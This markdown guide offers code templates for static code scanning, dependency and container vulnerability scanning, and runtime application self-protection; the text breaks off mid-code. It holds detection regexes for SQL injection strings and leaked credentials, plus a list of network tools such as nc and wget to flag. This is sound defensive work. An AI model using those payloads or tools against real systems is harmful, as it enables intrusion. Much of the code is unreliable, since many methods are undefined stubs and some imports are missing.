# AI-Powered Security Scanning Templates

Comprehensive templates for implementing security scanning and vulnerability detection using AI assistance.

## 🔒 Static Security Analysis

### 1. Code Security Scanner Template

```python
import ast
import re
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass
from enum import Enum
import subprocess
from pathlib import Path

class VulnerabilityType(Enum):
    SQL_INJECTION = "SQL Injection"
    XSS = "Cross-Site Scripting"
    COMMAND_INJECTION = "Command Injection"
    PATH_TRAVERSAL = "Path Traversal"
    XXE = "XML External Entity"
    SSRF = "Server-Side Request Forgery"
    INSECURE_DESERIALIZATION = "Insecure Deserialization"
    WEAK_CRYPTO = "Weak Cryptography"
    HARDCODED_SECRETS = "Hardcoded Secrets"
    RACE_CONDITIONS = "Race Conditions"

@dataclass
class SecurityFinding:
    vulnerability_type: VulnerabilityType
    severity: str  # Critical, High, Medium, Low
    confidence: str  # High, Medium, Low
    file_path: str
    line_number: int
    column_number: int
    code_snippet: str
    description: str
    remediation: str
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None

class AISecurityScanner:
    """AI-powered security scanner for comprehensive vulnerability detection"""
    
    def __init__(self):
        self.findings: List[SecurityFinding] = []
        self.patterns = self._initialize_patterns()
        
    def _initialize_patterns(self) -> Dict[str, List[Dict[str, Any]]]:
        """Initialize security vulnerability patterns"""
        return {
            VulnerabilityType.SQL_INJECTION: [
                {
                    'pattern': re.compile(r'(execute|query)\s*\(\s*["\'].*\+.*["\']', re.IGNORECASE),
                    'languages': ['python', 'javascript', 'java'],
                    'severity': 'Critical',
                    'cwe_id': 'CWE-89'
                },
                {
                    'pattern': re.compile(r'f["\'].*SELECT.*WHERE.*{.*}', re.IGNORECASE),
                    'languages': ['python'],
                    'severity': 'Critical',
                    'cwe_id': 'CWE-89'
                }
            ],
            VulnerabilityType.XSS: [
                {
                    'pattern': re.compile(r'innerHTML\s*=\s*[^"\'].*\+'),
                    'languages': ['javascript', 'typescript'],
                    'severity': 'High',
                    'cwe_id': 'CWE-79'
                },
                {
                    'pattern': re.compile(r'document\.write\s*\(.*\+.*\)'),
                    'languages': ['javascript'],
                    'severity': 'High',
                    'cwe_id': 'CWE-79'
                }
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                {
                    'pattern': re.compile(r'os\.(system|popen)\s*\(.*\+.*\)'),
                    'languages': ['python'],
                    'severity': 'Critical',
                    'cwe_id': 'CWE-78'
                },
                {
                    'pattern': re.compile(r'subprocess\.(run|call|Popen)\s*\([^,]*\+[^,]*,\s*shell\s*=\s*True'),
                    'languages': ['python'],
                    'severity': 'Critical',
                    'cwe_id': 'CWE-78'
                }
            ],
            VulnerabilityType.HARDCODED_SECRETS: [
                {
                    'pattern': re.compile(r'(password|passwd|pwd)\s*=\s*["\'][^"\']{8,}["\']', re.IGNORECASE),
                    'languages': ['all'],
                    'severity': 'High',
                    'cwe_id': 'CWE-798'
                },
                {
                    'pattern': re.compile(r'(api_?key|apikey|secret)\s*=\s*["\'][a-zA-Z0-9]{20,}["\']', re.IGNORECASE),
                    'languages': ['all'],
                    'severity': 'High',
                    'cwe_id': 'CWE-798'
                }
            ]
        }
    
    def scan_file(self, file_path: Path) -> List[SecurityFinding]:
        """Scan a single file for security vulnerabilities"""
        if not file_path.exists():
            return []
        
        content = file_path.read_text()
        language = self._detect_language(file_path)
        
        # Pattern-based scanning
        self._scan_patterns(content, file_path, language)
        
        # Language-specific analysis
        if language == 'python':
            self._analyze_python_ast(content, file_path)
        elif language in ['javascript', 'typescript']:
            self._analyze_javascript(content, file_path)
        
        # AI-enhanced analysis
        self._ai_contextual_analysis(content, file_path, language)
        
        return self.findings
    
    def _scan_patterns(self, content: str, file_path: Path, language: str):
        """Scan content using regex patterns"""
        lines = content.split('\n')
        
        for vuln_type, patterns in self.patterns.items():
            for pattern_info in patterns:
                pattern = pattern_info['pattern']
                
                if 'all' in pattern_info['languages'] or language in pattern_info['languages']:
                    for match in pattern.finditer(content):
                        line_num = content[:match.start()].count('\n') + 1
                        col_num = match.start() - content.rfind('\n', 0, match.start()) - 1
                        
                        self.findings.append(SecurityFinding(
                            vulnerability_type=vuln_type,
                            severity=pattern_info['severity'],
                            confidence='High',
                            file_path=str(file_path),
                            line_number=line_num,
                            column_number=col_num,
                            code_snippet=lines[line_num - 1].strip(),
                            description=self._generate_description(vuln_type, match.group()),
                            remediation=self._generate_remediation(vuln_type),
                            cwe_id=pattern_info.get('cwe_id'),
                            owasp_category=self._get_owasp_category(vuln_type)
                        ))
    
    def _analyze_python_ast(self, content: str, file_path: Path):
        """Perform AST-based analysis for Python code"""
        try:
            tree = ast.parse(content)
            
            # Check for dangerous function calls
            for node in ast.walk(tree):
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Attribute):
                        if node.func.attr == 'eval':
                            self.findings.append(SecurityFinding(
                                vulnerability_type=VulnerabilityType.COMMAND_INJECTION,
                                severity='Critical',
                                confidence='High',
                                file_path=str(file_path),
                                line_number=node.lineno,
                                column_number=node.col_offset,
                                code_snippet=ast.unparse(node),
                                description="Use of eval() function can lead to code injection",
                                remediation="Use ast.literal_eval() for safe evaluation or refactor to avoid eval",
                                cwe_id='CWE-95'
                            ))
                
                # Check for insecure random
                if isinstance(node, ast.Import):
                    for alias in node.names:
                        if alias.name == 'random':
                            self._check_for_crypto_usage(tree, file_path)
        
        except SyntaxError:
            pass  # Handle syntax errors gracefully
    
    def _ai_contextual_analysis(self, content: str, file_path: Path, language: str):
        """AI-enhanced contextual security analysis"""
        # TODO: Implement AI-powered analysis
        # This would integrate with AI models for:
        # - Understanding code context
        # - Detecting business logic vulnerabilities
        # - Identifying complex injection patterns
        # - Finding authentication/authorization issues
        pass
    
    def _generate_description(self, vuln_type: VulnerabilityType, context: str) -> str:
        """Generate detailed vulnerability description"""
        descriptions = {
            VulnerabilityType.SQL_INJECTION: f"SQL injection vulnerability detected. User input appears to be concatenated directly into SQL query: '{context}'. This could allow attackers to modify or extract database data.",
            VulnerabilityType.XSS: f"Cross-site scripting vulnerability found. Unescaped user input is being inserted into HTML: '{context}'. This could allow attackers to execute malicious scripts.",
            VulnerabilityType.COMMAND_INJECTION: f"Command injection vulnerability identified. User input is passed to system command: '{context}'. Attackers could execute arbitrary system commands.",
            VulnerabilityType.HARDCODED_SECRETS: f"Hardcoded credential detected: '{context[:20]}...'. This exposes sensitive information in source code."
        }
        return descriptions.get(vuln_type, f"Security vulnerability detected: {vuln_type.value}")
    
    def _generate_remediation(self, vuln_type: VulnerabilityType) -> str:
        """Generate remediation advice"""
        remediations = {
            VulnerabilityType.SQL_INJECTION: """
1. Use parameterized queries or prepared statements
2. Use an ORM with built-in SQL injection protection
3. Validate and sanitize all user input
4. Apply the principle of least privilege to database users

Example (Python):
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
""",
            VulnerabilityType.XSS: """
1. Encode all user input before displaying in HTML
2. Use Content Security Policy (CSP) headers
3. Validate input on both client and server side
4. Use templating engines with auto-escaping

Example (JavaScript):
element.textContent = userInput; // Safe
// Instead of: element.innerHTML = userInput; // Unsafe
""",
            VulnerabilityType.COMMAND_INJECTION: """
1. Avoid system commands when possible
2. Use language-specific libraries instead of shell commands
3. If commands are necessary, use parameterized commands
4. Whitelist allowed commands and arguments

Example (Python):
subprocess.run(['ls', '-l', user_input], shell=False)  # Safer
""",
            VulnerabilityType.HARDCODED_SECRETS: """
1. Use environment variables for sensitive data
2. Use secure secret management systems (AWS Secrets Manager, HashiCorp Vault)
3. Never commit secrets to version control
4. Rotate credentials regularly

Example:
password = os.environ.get('DB_PASSWORD')
"""
        }
        return remediations.get(vuln_type, "Review and fix the security issue according to OWASP guidelines.")
    
    def generate_report(self, format: str = 'json') -> str:
        """Generate security scan report"""
        if format == 'json':
            return json.dumps([{
                'type': f.vulnerability_type.value,
                'severity': f.severity,
                'confidence': f.confidence,
                'file': f.file_path,
                'line': f.line_number,
                'column': f.column_number,
                'description': f.description,
                'remediation': f.remediation,
                'cwe_id': f.cwe_id,
                'owasp_category': f.owasp_category
            } for f in self.findings], indent=2)
        
        elif format == 'sarif':
            # SARIF format for CI/CD integration
            return self._generate_sarif_report()
        
        else:  # Human-readable format
            report = "=== Security Scan Report ===\n\n"
            
            if not self.findings:
                report += "✅ No security vulnerabilities detected!\n"
                return report
            
            # Group by severity
            severity_groups = {}
            for finding in self.findings:
                severity_groups.setdefault(finding.severity, []).append(finding)
            
            for severity in ['Critical', 'High', 'Medium', 'Low']:
                if severity in severity_groups:
                    report += f"\n{severity.upper()} SEVERITY ({len(severity_groups[severity])} issues):\n"
                    report += "=" * 50 + "\n\n"
                    
                    for finding in severity_groups[severity]:
                        report += f"📍 {finding.vulnerability_type.value}\n"
                        report += f"   File: {finding.file_path}:{finding.line_number}\n"
                        report += f"   Code: {finding.code_snippet}\n"
                        report += f"   Description: {finding.description}\n"
                        report += f"   Remediation: {finding.remediation.strip()}\n"
                        if finding.cwe_id:
                            report += f"   CWE: {finding.cwe_id}\n"
                        report += "\n"
            
            return report
    
    def _detect_language(self, file_path: Path) -> str:
        """Detect programming language from file extension"""
        extension_map = {
            '.py': 'python',
            '.js': 'javascript',
            '.ts': 'typescript',
            '.java': 'java',
            '.cs': 'csharp',
            '.php': 'php',
            '.rb': 'ruby',
            '.go': 'go'
        }
        return extension_map.get(file_path.suffix, 'unknown')
    
    def _get_owasp_category(self, vuln_type: VulnerabilityType) -> str:
        """Map vulnerability to OWASP category"""
        owasp_map = {
            VulnerabilityType.SQL_INJECTION: "A03:2021 - Injection",
            VulnerabilityType.XSS: "A03:2021 - Injection",
            VulnerabilityType.COMMAND_INJECTION: "A03:2021 - Injection",
            VulnerabilityType.XXE: "A05:2021 - Security Misconfiguration",
            VulnerabilityType.WEAK_CRYPTO: "A02:2021 - Cryptographic Failures",
            VulnerabilityType.HARDCODED_SECRETS: "A07:2021 - Identification and Authentication Failures"
        }
        return owasp_map.get(vuln_type, "")

# Usage
scanner = AISecurityScanner()
findings = scanner.scan_file(Path("app.py"))
print(scanner.generate_report(format='human'))
```

### 2. Dependency Vulnerability Scanner

```javascript
// AI-enhanced dependency vulnerability scanning

const fs = require('fs').promises;
const path = require('path');
const semver = require('semver');
const axios = require('axios');

class DependencyVulnerabilityScanner {
  constructor() {
    this.vulnerabilities = [];
    this.auditCache = new Map();
  }
  
  async scanProject(projectPath) {
    console.log('🔍 Scanning project dependencies for vulnerabilities...');
    
    // Detect package manager
    const packageManager = await this.detectPackageManager(projectPath);
    
    // Scan based on package manager
    switch (packageManager) {
      case 'npm':
        await this.scanNpmDependencies(projectPath);
        break;
      case 'yarn':
        await this.scanYarnDependencies(projectPath);
        break;
      case 'pip':
        await this.scanPythonDependencies(projectPath);
        break;
      case 'maven':
        await this.scanMavenDependencies(projectPath);
        break;
      case 'gradle':
        await this.scanGradleDependencies(projectPath);
        break;
    }
    
    // AI-enhanced analysis
    await this.performAIAnalysis();
    
    return this.generateReport();
  }
  
  async detectPackageManager(projectPath) {
    // TODO: Detect package manager based on lock files
    // - package-lock.json → npm
    // - yarn.lock → yarn
    // - requirements.txt/Pipfile.lock → pip
    // - pom.xml → maven
    // - build.gradle → gradle
    
    const files = await fs.readdir(projectPath);
    
    if (files.includes('package-lock.json')) return 'npm';
    if (files.includes('yarn.lock')) return 'yarn';
    if (files.includes('requirements.txt') || files.includes('Pipfile.lock')) return 'pip';
    if (files.includes('pom.xml')) return 'maven';
    if (files.includes('build.gradle')) return 'gradle';
    
    return null;
  }
  
  async scanNpmDependencies(projectPath) {
    const packageJsonPath = path.join(projectPath, 'package.json');
    const lockFilePath = path.join(projectPath, 'package-lock.json');
    
    try {
      // Read package files
      const packageJson = JSON.parse(await fs.readFile(packageJsonPath, 'utf8'));
      const lockFile = JSON.parse(await fs.readFile(lockFilePath, 'utf8'));
      
      // Extract all dependencies
      const allDeps = {
        ...packageJson.dependencies,
        ...packageJson.devDependencies,
        ...packageJson.optionalDependencies
      };
      
      // Check each dependency
      for (const [depName, depVersion] of Object.entries(allDeps)) {
        await this.checkNpmPackage(depName, depVersion, lockFile);
      }
      
      // Check for outdated packages
      await this.checkOutdatedPackages(allDeps);
      
      // Check for license compliance
      await this.checkLicenseCompliance(lockFile);
      
    } catch (error) {
      console.error('Error scanning NPM dependencies:', error);
    }
  }
  
  async checkNpmPackage(packageName, versionRange, lockFile) {
    // Get actual installed version from lock file
    const installedVersion = this.getInstalledVersion(packageName, lockFile);
    
    // Check vulnerability databases
    const vulnerabilities = await this.queryVulnerabilityDatabases(
      'npm',
      packageName,
      installedVersion
    );
    
    if (vulnerabilities.length > 0) {
      vulnerabilities.forEach(vuln => {
        this.vulnerabilities.push({
          package: packageName,
          version: installedVersion,
          vulnerability: vuln,
          severity: vuln.severity,
          recommendation: this.generateRecommendation(vuln, packageName, installedVersion)
        });
      });
    }
    
    // Check for suspicious package patterns
    await this.checkSuspiciousPatterns(packageName, installedVersion);
  }
  
  async queryVulnerabilityDatabases(ecosystem, packageName, version) {
    // Query multiple vulnerability databases
    const sources = [
      this.queryNVD(ecosystem, packageName, version),
      this.querySnyk(ecosystem, packageName, version),
      this.queryOSVDB(ecosystem, packageName, version),
      this.queryGitHubAdvisories(ecosystem, packageName, version)
    ];
    
    const results = await Promise.allSettled(sources);
    
    // Aggregate vulnerabilities from all sources
    const vulnerabilities = [];
    results.forEach(result => {
      if (result.status === 'fulfilled' && result.value) {
        vulnerabilities.push(...result.value);
      }
    });
    
    // Deduplicate by CVE ID
    const uniqueVulns = this.deduplicateVulnerabilities(vulnerabilities);
    
    return uniqueVulns;
  }
  
  async checkSuspiciousPatterns(packageName, version) {
    // AI-powered suspicious pattern detection
    const suspiciousPatterns = [
      {
        pattern: /^[a-z]{1}$/,  // Single letter packages
        risk: 'Typosquatting',
        severity: 'High'
      },
      {
        pattern: /test|debug|demo/i,
        risk: 'Development package in production',
        severity: 'Medium'
      },
      {
        pattern: /eval|exec/i,
        risk: 'Potentially dangerous operations',
        severity: 'High'
      }
    ];
    
    // Check package name patterns
    suspiciousPatterns.forEach(({ pattern, risk, severity }) => {
      if (pattern.test(packageName)) {
        this.vulnerabilities.push({
          package: packageName,
          version: version,
          vulnerability: {
            type: 'Suspicious Pattern',
            description: risk,
            severity: severity
          }
        });
      }
    });
    
    // Check for package confusion attacks
    await this.checkPackageConfusion(packageName);
  }
  
  async checkPackageConfusion(packageName) {
    // Check if internal package name exists in public registry
    const internalPackagePatterns = [
      /^@company\//,  // Scoped packages
      /internal|private|corp/i
    ];
    
    const isInternalPackage = internalPackagePatterns.some(
      pattern => pattern.test(packageName)
    );
    
    if (isInternalPackage) {
      // Verify package source
      try {
        const registryInfo = await this.getRegistryInfo(packageName);
        
        if (registryInfo.repository && !registryInfo.repository.includes('company.com')) {
          this.vulnerabilities.push({
            package: packageName,
            version: 'all',
            vulnerability: {
              type: 'Dependency Confusion',
              description: 'Internal package name found in public registry',
              severity: 'Critical',
              cve: 'N/A'
            }
          });
        }
      } catch (error) {
        // Package might not exist in public registry
      }
    }
  }
  
  async performAIAnalysis() {
    // TODO: Implement AI-enhanced analysis
    // - Predict zero-day vulnerabilities
    // - Analyze code patterns in dependencies
    // - Check for malicious behavior patterns
    // - Supply chain attack detection
    
    // Analyze dependency tree for risks
    await this.analyzeDependencyTree();
    
    // Check for abandoned packages
    await this.checkAbandonedPackages();
    
    // Analyze transitive dependencies
    await this.analyzeTransitiveDependencies();
  }
  
  async analyzeDependencyTree() {
    // Build dependency graph
    const depGraph = await this.buildDependencyGraph();
    
    // Find critical paths
    const criticalPaths = this.findCriticalPaths(depGraph);
    
    // Check for deep dependency chains
    criticalPaths.forEach(path => {
      if (path.length > 5) {
        this.vulnerabilities.push({
          type: 'Complex Dependency Chain',
          description: `Deep dependency chain detected: ${path.join(' → ')}`,
          severity: 'Low',
          recommendation: 'Consider reducing dependency depth to minimize supply chain risks'
        });
      }
    });
  }
  
  generateRecommendation(vulnerability, packageName, currentVersion) {
    const recommendations = [];
    
    // Check if patch is available
    if (vulnerability.patchedVersions) {
      const patchVersion = this.findBestPatchVersion(
        currentVersion,
        vulnerability.patchedVersions
      );
      
      if (patchVersion) {
        recommendations.push(
          `Update ${packageName} to version ${patchVersion} or higher`
        );
      }
    }
    
    // Add specific remediation steps
    if (vulnerability.type === 'SQL Injection') {
      recommendations.push(
        'Review and update all database queries to use parameterized statements'
      );
    } else if (vulnerability.type === 'XSS') {
      recommendations.push(
        'Implement proper input sanitization and output encoding'
      );
    }
    
    // Add general security practices
    recommendations.push(
      'Review the package changelog for security fixes',
      'Consider using alternative packages if no patch is available',
      'Implement runtime security monitoring'
    );
    
    return recommendations.join('\n');
  }
  
  generateReport() {
    const report = {
      summary: {
        total: this.vulnerabilities.length,
        critical: this.vulnerabilities.filter(v => v.severity === 'Critical').length,
        high: this.vulnerabilities.filter(v => v.severity === 'High').length,
        medium: this.vulnerabilities.filter(v => v.severity === 'Medium').length,
        low: this.vulnerabilities.filter(v => v.severity === 'Low').length
      },
      vulnerabilities: this.vulnerabilities,
      recommendations: this.generateOverallRecommendations(),
      timestamp: new Date().toISOString()
    };
    
    return report;
  }
  
  generateOverallRecommendations() {
    const recommendations = [];
    
    if (this.vulnerabilities.some(v => v.severity === 'Critical')) {
      recommendations.push({
        priority: 'Immediate',
        action: 'Address all critical vulnerabilities before deployment',
        details: 'Critical vulnerabilities can lead to immediate compromise'
      });
    }
    
    // Check for patterns
    const packageCounts = {};
    this.vulnerabilities.forEach(v => {
      packageCounts[v.package] = (packageCounts[v.package] || 0) + 1;
    });
    
    // Find packages with multiple vulnerabilities
    Object.entries(packageCounts).forEach(([pkg, count]) => {
      if (count > 2) {
        recommendations.push({
          priority: 'High',
          action: `Consider replacing ${pkg}`,
          details: `This package has ${count} known vulnerabilities`
        });
      }
    });
    
    // General recommendations
    recommendations.push(
      {
        priority: 'Medium',
        action: 'Implement automated dependency scanning in CI/CD',
        details: 'Catch vulnerabilities before they reach production'
      },
      {
        priority: 'Medium',
        action: 'Set up dependency update automation',
        details: 'Keep dependencies up-to-date with tools like Dependabot'
      },
      {
        priority: 'Low',
        action: 'Review and minimize dependency footprint',
        details: 'Fewer dependencies mean smaller attack surface'
      }
    );
    
    return recommendations;
  }
}

// Usage
const scanner = new DependencyVulnerabilityScanner();
const report = await scanner.scanProject('./my-project');
console.log(JSON.stringify(report, null, 2));
```

### 3. Container Security Scanner

```yaml
# AI-powered container security scanning template

apiVersion: v1
kind: ConfigMap
metadata:
  name: container-security-scanner
data:
  scanner.py: |
    #!/usr/bin/env python3
    import docker
    import json
    import subprocess
    from typing import List, Dict, Any
    import re
    
    class ContainerSecurityScanner:
        """AI-enhanced container security scanner"""
        
        def __init__(self):
            self.client = docker.from_env()
            self.findings = []
            
        def scan_image(self, image_name: str) -> Dict[str, Any]:
            """Comprehensive container image security scan"""
            print(f"🔍 Scanning container image: {image_name}")
            
            # Pull image if not exists
            try:
                image = self.client.images.get(image_name)
            except docker.errors.ImageNotFound:
                print(f"Pulling image {image_name}...")
                image = self.client.images.pull(image_name)
            
            # Perform multiple security checks
            results = {
                'image': image_name,
                'vulnerabilities': self.scan_vulnerabilities(image),
                'misconfigurations': self.check_misconfigurations(image),
                'secrets': self.scan_for_secrets(image),
                'compliance': self.check_compliance(image),
                'supply_chain': self.analyze_supply_chain(image),
                'runtime_risks': self.assess_runtime_risks(image)
            }
            
            return results
        
        def scan_vulnerabilities(self, image) -> List[Dict]:
            """Scan for known CVEs and vulnerabilities"""
            vulnerabilities = []
            
            # Use multiple scanners for comprehensive coverage
            scanners = [
                self.run_trivy_scan,
                self.run_clair_scan,
                self.run_anchore_scan
            ]
            
            for scanner in scanners:
                try:
                    vulns = scanner(image.tags[0] if image.tags else image.id)
                    vulnerabilities.extend(vulns)
                except Exception as e:
                    print(f"Scanner failed: {e}")
            
            # Deduplicate and prioritize
            return self.prioritize_vulnerabilities(vulnerabilities)
        
        def run_trivy_scan(self, image_name: str) -> List[Dict]:
            """Run Trivy vulnerability scanner"""
            cmd = ['trivy', 'image', '--format', 'json', image_name]
            
            try:
                result = subprocess.run(cmd, capture_output=True, text=True)
                if result.returncode == 0:
                    data = json.loads(result.stdout)
                    return self.parse_trivy_results(data)
            except Exception as e:
                print(f"Trivy scan failed: {e}")
            
            return []
        
        def check_misconfigurations(self, image) -> List[Dict]:
            """Check for security misconfigurations"""
            misconfigs = []
            
            # Get image configuration
            config = image.attrs['Config']
            
            # Check for running as root
            if not config.get('User') or config['User'] == 'root':
                misconfigs.append({
                    'type': 'ROOT_USER',
                    'severity': 'High',
                    'description': 'Container runs as root user',
                    'remediation': 'Use USER directive to run as non-root'
                })
            
            # Check for dangerous capabilities
            if 'Capabilities' in config:
                dangerous_caps = ['SYS_ADMIN', 'NET_ADMIN', 'SYS_PTRACE']
                for cap in dangerous_caps:
                    if cap in config['Capabilities']:
                        misconfigs.append({
                            'type': 'DANGEROUS_CAPABILITY',
                            'severity': 'High',
                            'description': f'Container has dangerous capability: {cap}',
                            'remediation': f'Remove {cap} capability unless required'
                        })
            
            # Check exposed ports
            exposed_ports = config.get('ExposedPorts', {})
            for port in exposed_ports:
                port_num = int(port.split('/')[0])
                if port_num < 1024:
                    misconfigs.append({
                        'type': 'PRIVILEGED_PORT',
                        'severity': 'Medium',
                        'description': f'Exposes privileged port: {port_num}',
                        'remediation': 'Use ports above 1024 for non-root containers'
                    })
            
            # Check for security options
            if not config.get('SecurityOpt'):
                misconfigs.append({
                    'type': 'NO_SECURITY_OPTIONS',
                    'severity': 'Medium',
                    'description': 'No security options configured',
                    'remediation': 'Add security options like no-new-privileges'
                })
            
            return misconfigs
        
        def scan_for_secrets(self, image) -> List[Dict]:
            """Scan for hardcoded secrets and sensitive data"""
            secrets = []
            
            # Extract image layers
            layers = self.extract_image_layers(image)
            
            # Patterns for secret detection
            secret_patterns = [
                (r'(api[_-]?key|apikey)\s*[:=]\s*["\']?([A-Za-z0-9+/]{20,})', 'API Key'),
                (r'(password|passwd|pwd)\s*[:=]\s*["\']?([^"\'\s]{8,})', 'Password'),
                (r'-----BEGIN (RSA |DSA |EC )?PRIVATE KEY-----', 'Private Key'),
                (r'(aws_access_key_id|aws_secret_access_key)\s*[:=]\s*["\']?([A-Za-z0-9+/]{20,})', 'AWS Credentials'),
                (r'(token|auth[_-]?token)\s*[:=]\s*["\']?([A-Za-z0-9+/._-]{20,})', 'Authentication Token')
            ]
            
            for layer_path in layers:
                # Scan each layer for secrets
                for pattern, secret_type in secret_patterns:
                    matches = self.search_in_layer(layer_path, pattern)
                    for match in matches:
                        secrets.append({
                            'type': secret_type,
                            'severity': 'Critical',
                            'layer': layer_path,
                            'pattern_matched': match[:50] + '...' if len(match) > 50 else match,
                            'remediation': 'Remove hardcoded secrets and use secret management'
                        })
            
            return secrets
        
        def check_compliance(self, image) -> Dict[str, List]:
            """Check compliance with security standards"""
            compliance_results = {
                'cis_docker_benchmark': self.check_cis_docker_compliance(image),
                'pci_dss': self.check_pci_compliance(image),
                'nist': self.check_nist_compliance(image),
                'custom_policies': self.check_custom_policies(image)
            }
            
            return compliance_results
        
        def analyze_supply_chain(self, image) -> Dict[str, Any]:
            """Analyze container supply chain security"""
            supply_chain_analysis = {
                'base_image': self.analyze_base_image(image),
                'layers': self.analyze_layers(image),
                'signatures': self.verify_signatures(image),
                'sbom': self.generate_sbom(image),
                'provenance': self.check_provenance(image)
            }
            
            return supply_chain_analysis
        
        def assess_runtime_risks(self, image) -> List[Dict]:
            """Assess potential runtime security risks"""
            runtime_risks = []
            
            # Check for risky binaries
            risky_binaries = ['nc', 'netcat', 'curl', 'wget', 'gcc', 'make']
            installed_binaries = self.get_installed_binaries(image)
            
            for binary in risky_binaries:
                if binary in installed_binaries:
                    runtime_risks.append({
                        'type': 'RISKY_BINARY',
                        'severity': 'Medium',
                        'binary': binary,
                        'description': f'Container includes potentially risky binary: {binary}',
                        'remediation': f'Remove {binary} if not required for application'
                    })
            
            # Check for shell access
            if self.has_shell_access(image):
                runtime_risks.append({
                    'type': 'SHELL_ACCESS',
                    'severity': 'Low',
                    'description': 'Container has shell access',
                    'remediation': 'Consider using distroless images'
                })
            
            # Check for writable directories
            writable_dirs = self.check_writable_directories(image)
            if writable_dirs:
                runtime_risks.append({
                    'type': 'WRITABLE_DIRECTORIES',
                    'severity': 'Medium',
                    'directories': writable_dirs,
                    'description': 'Container has world-writable directories',
                    'remediation': 'Set appropriate permissions on directories'
                })
            
            return runtime_risks
        
        def generate_remediation_script(self, findings: Dict) -> str:
            """Generate automated remediation Dockerfile"""
            dockerfile = f"""
# Security-hardened Dockerfile based on scan results
FROM {findings['image']}

# Switch to non-root user
RUN groupadd -r appuser && useradd -r -g appuser appuser

# Remove dangerous binaries
RUN rm -f /usr/bin/nc /usr/bin/netcat /usr/bin/wget || true

# Set secure permissions
RUN chmod -R go-w /usr /etc || true

# Add security options
USER appuser

# Health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD curl -f http://localhost/health || exit 1

# Security labels
LABEL security.scan.date="{datetime.now().isoformat()}"
LABEL security.scan.tool="AI Security Scanner"
"""
            return dockerfile
        
        def generate_report(self, scan_results: Dict) -> str:
            """Generate comprehensive security report"""
            # Generate different report formats
            return {
                'html': self.generate_html_report(scan_results),
                'json': json.dumps(scan_results, indent=2),
                'sarif': self.generate_sarif_report(scan_results),
                'pdf': self.generate_pdf_report(scan_results)
            }

# Kubernetes admission controller for security
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingWebhookConfiguration
metadata:
  name: security-admission-webhook
webhooks:
  - name: security.scanner.io
    clientConfig:
      service:
        name: security-scanner
        namespace: security
        path: "/validate"
      caBundle: LS0tLS1CRUdJTi... # Base64 encoded CA cert
    rules:
      - operations: ["CREATE", "UPDATE"]
        apiGroups: ["apps"]
        apiVersions: ["v1"]
        resources: ["deployments", "statefulsets", "daemonsets"]
    admissionReviewVersions: ["v1", "v1beta1"]
    sideEffects: None
    failurePolicy: Fail
    namespaceSelector:
      matchLabels:
        security-scanning: "enabled"
```

## 🛡️ Runtime Security Monitoring

### 4. Runtime Application Self-Protection (RASP)

```python
# AI-powered runtime security protection

import time
import threading
import inspect
import sys
from functools import wraps
from collections import defaultdict
import ast
import dis

class AIRuntimeProtection:
    """AI-enhanced runtime application self-protection"""
    
    def __init__(self):
        self.suspicious_activities = defaultdict(list)
        self.blocked_requests = []
        self.ml_model = self.load_ml_model()
        self.start_monitoring()
    
    def protect(self, func):
        """Decorator to protect functions at runtime"""
        
        @wraps(func)
        def wrapper(*args, **kwargs):
            # Pre-execution checks
            context = self.extract_context(func, args, kwargs)
            
            # AI-based threat detection
            threat_score = self.analyze_threat(context)
            
            if threat_score > 0.8:
                self.block_execution(context, threat_score)
                raise SecurityException(f"Suspicious activity detected: {context['reason']}")
            
            # Monitor execution
            start_time = time.time()
            try:
                result = func(*args, **kwargs)
                execution_time = time.time() - start_time
                
                # Post-execution analysis
                self.analyze_result(context, result, execution_time)
                
                return result
                
            except Exception as e:
                # Analyze exceptions for security issues
                self.analyze_exception(context, e)
                raise
        
        return wrapper
    
    def extract_context(self, func, args, kwargs):
        """Extract execution context for analysis"""
        context = {
            'function': func.__name__,
            'module': func.__module__,
            'timestamp': time.time(),
            'call_stack': self.get_call_stack(),
            'arguments': self.sanitize_arguments(args, kwargs),
            'source_ip': self.get_source_ip(),
            'user': self.get_current_user()
        }
        
        # Extract code characteristics
        context['code_features'] = self.extract_code_features(func)
        
        return context
    
    def analyze_threat(self, context):
        """AI-based threat analysis"""
        
        # Rule-based checks
        threat_indicators = []
        
        # Check for SQL injection patterns
        sql_patterns = [
            r"('\s*(OR|AND)\s*'?\d*'\s*=\s*'?\d*)",
            r"(--|\#|\/\*)",
            r"(UNION\s+SELECT)",
            r"(DROP\s+TABLE)"
        ]
        
        for arg in context['arguments'].values():
            if isinstance(arg, str):
                for pattern in sql_patterns:
                    if re.search(pattern, arg, re.IGNORECASE):
                        threat_indicators.append({
                            'type': 'SQL_INJECTION',
                            'confidence': 0.9,
                            'pattern': pattern
                        })
        
        # Check for path traversal
        if any('../' in str(arg) for arg in context['arguments'].values()):
            threat_indicators.append({
                'type': 'PATH_TRAVERSAL',
                'confidence': 0.8
            })
        
        # ML-based anomaly detection
        ml_score = self.ml_anomaly_detection(context)
        
        # Combine scores
        if threat_indicators:
            max_confidence = max(t['confidence'] for t in threat_indicators)
            return max(max_confidence, ml_score)
        
        return ml_score
    
    def ml_anomaly_detection(self, context):
        """Machine learning based anomaly detection"""
        
        # Extract features
        features = self.extract_ml_features(context)
        
        # Predict using trained model
        if self.ml_model:
            try:
                anomaly_score = self.ml_model.predict_proba([features])[0][1]
                return anomaly_score
            except:
                # Fallback to rule-based if ML fails
                pass
        
        # Heuristic anomaly detection
        anomaly_score = 0.0
        
        # Unusual call patterns
        call_frequency = self.get_call_frequency(context['function'])
        if call_frequency > 100:  # calls per minute
            anomaly_score = max(anomaly_score, 0.7)
        
        # Suspicious timing
        current_hour = time.localtime().tm_hour
        if 0 <= current_hour <= 6:  # Late night activity
            anomaly_score = max(anomaly_score, 0.3)
        
        # Unusual arguments
        arg_entropy = self.calculate_argument_entropy(context['arguments'])
        if arg_entropy > 0.8:
            anomaly_score = max(anomaly_score, 0.6)
        
        return anomaly_score
    
    def protect_sql_query(self, query_func):
        """Specialized protection for SQL queries"""
        
        @wraps(query_func)
        def wrapper(query, *args, **kwargs):
            # Validate query structure
            if not self.is_parameterized_query(query):
                self.log_security_event({
                    'type': 'NON_PARAMETERIZED_QUERY',
                    'query': query[:100],
                    'severity': 'High'
                })
                
                # Try to auto-parameterize
                safe_query = self.auto_parameterize(query, args)
                if safe_query:
